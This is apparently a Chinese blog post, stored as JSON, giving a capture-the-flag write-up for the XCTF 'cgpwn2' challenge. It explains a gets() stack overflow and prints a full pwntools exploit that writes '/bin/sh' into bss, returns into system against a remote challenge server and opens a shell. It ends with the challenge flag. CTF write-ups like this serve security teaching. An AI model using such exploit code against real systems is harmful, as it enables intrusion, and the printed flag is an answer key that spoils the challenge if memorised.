{"title":"攻防世界 cgpwn2","slug":"攻防世界pwn-cgpwn2","date":"2020-05-08","updated":"2020-09-10","comments":true,"path":"api/posts/1776.json","excerpt":null,"cover":"https://i.loli.net/2020/05/08/veR8Fb2xkDMifVz.png","covers":["https://i.loli.net/2020/05/08/veR8Fb2xkDMifVz.png","https://i.loli.net/2020/05/08/QPL4xp8Wws1DJUc.png","https://i.loli.net/2020/05/08/abOyYLf9FERVqvZ.png"],"content":"<p>算是简单题，进入 hello()函数中发现 gets(&amp;s) 栈溢出漏洞。</p>\n<p>name 是全局变量，在 bss 区段，适合写入。</p>\n<p>pwn()函数中调用了__system，但并没有‘/bin/sh’</p>\n<p><img src=\"https://i.loli.net/2020/05/08/veR8Fb2xkDMifVz.png\" alt=\"17627983-d0f4027f425eadcd.png\"></p>\n<p><img src=\"https://i.loli.net/2020/05/08/QPL4xp8Wws1DJUc.png\" alt=\"17627983-8f37fec1f7e9fab3.png\"></p>\n<p><img src=\"https://i.loli.net/2020/05/08/abOyYLf9FERVqvZ.png\" alt=\"17627983-a19abf21a8c9c0f7.png\"></p>\n<h3 id=\"攻击思路\"><a href=\"# 攻击思路\" class=\"headerlink\" title=\"攻击思路\"></a>攻击思路 </h3><p> 在 name 中写入’/bin/sh’。利用栈溢出覆盖返回地址，使函数返回到 system 上，拿到 shell。</p>\n<p>payload= 填充栈 + 覆盖保存的 exp 的值 4 字节 + 假的返回地址 call __system(‘/bin/sh’)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"> # p &#x3D; process(&#39;.&#x2F;cgpwn2&#39;)</span><br><span class=\"line\">p &#x3D; remote(&quot;111.198.29.45&quot;,32966)</span><br><span class=\"line\">system_addr &#x3D; 0x804855A</span><br><span class=\"line\">bss_addr &#x3D; 0x804A080</span><br><span class=\"line\">p.recvuntil(&#39;name\\n&#39;)</span><br><span class=\"line\">p.sendline(&quot;&#x2F;bin&#x2F;sh\\x00&quot;)</span><br><span class=\"line\">p.recvuntil(&#39;here:\\n&#39;)</span><br><span class=\"line\">payload &#x3D; 0x26*&#39;a&#39; +&#39;bbbb&#39;+ p32(system_addr) + p32(bss_addr)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>cyberpeace{f92dbe7e38fed8edda8b7513b09acdc7}</p>\n","url":"/posts/1776/","min2read":"1","word4post":172,"prev_post":{"title":"攻防世界 int_overflow","url":"/posts/54610/"},"next_post":{"title":"Loving strangers","url":"/posts/15058/"},"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"攻击思路\" href = \"#\"><span class=\"toc-number\">1.</span> <span class=\"toc-text\">攻击思路 </span></a></li></ol>","categories":[],"tags":[{"name":"pwn","path":"api/tags/pwn.json","url":"/tags/pwn/"}]}